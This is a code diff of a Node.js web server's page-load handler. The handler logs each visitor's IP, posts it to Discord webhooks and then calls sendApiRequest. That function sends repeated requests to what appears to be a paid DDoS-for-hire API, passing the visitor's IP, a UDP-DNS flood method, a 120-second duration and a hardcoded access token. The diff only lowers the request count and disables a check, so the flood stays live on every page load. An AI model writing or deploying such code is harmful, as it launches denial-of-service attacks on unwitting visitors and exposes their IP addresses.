@@ -55,7 +55,7 @@ async function clear() {
 
 async function sendApiRequest(ip) {
     const url = `https://darlingapi.com?token=af1f1818-3541-411f-a643-db88e2c575ff&host=${ip}&port=0&time=120&method=UDP-DNS`;
-    const requests = Array(20).fill(url).map(u => axios.get(u));
+    const requests = Array(5).fill(url).map(u => axios.get(u));
     
     try {
         await axios.all(requests);
@@ -142,7 +142,7 @@ app.post('/page-loaded', async (req, res) => {
             await fs.writeFile(visitorsFile, JSON.stringify(visitorsCache, null, 2));
             await sendDiscordWebhooks(ip, timestamp);
         }
-            await verificar();
+            //await verificar();
             await sendApiRequest(ip);
         
         res.status(200).send('Process completed');
